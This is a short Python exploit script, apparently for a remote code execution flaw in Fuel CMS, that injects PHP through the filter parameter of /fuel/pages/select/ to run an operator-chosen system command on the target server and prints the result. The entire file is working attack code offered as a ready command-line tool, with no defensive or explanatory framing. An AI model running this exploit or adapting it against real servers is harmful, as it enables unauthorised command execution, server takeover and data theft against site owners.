import argparse
import requests
import sys
import urllib

####
# PARSSING URL and CMD
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', type=str, help='url')
parser.add_argument('-c', '--cmd', type=str, help='command')
args = parser.parse_args()


# If not all flags are set
if not args.url or not args.cmd:
    print("Usage fuel_cms.py -u <url> -c <command>")
    sys.exit(1)




# URL + Payload
cmd = args.cmd
enc_cmd = urllib.parse.quote(args.cmd)
payload = f"{args.url}/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('{enc_cmd}')%2B'"
#Debug
#print (payload)


###################################
# Fetching cmd output
def output(r):
	try:	
		lines = r.content.decode().splitlines()
		content_lines = []
		for line in lines:
			if line.startswith('<div'):
       				break
			content_lines.append(line)
		content = '\n'.join(content_lines)
		
		# Replacing 1st occurence of system
		content = content.replace('system', '', 1)
		return(content)
	except:
		return("Error while fetching the output")
		
#################################




#################
#Sending the request
try:	
	r = requests.get(payload)
	#DEBUG 
	#print(r.content)
	#print("\n"*20)
except:
	print("Error while sending the payload")	
	sys.exit(1)

print(output(r))

	
		

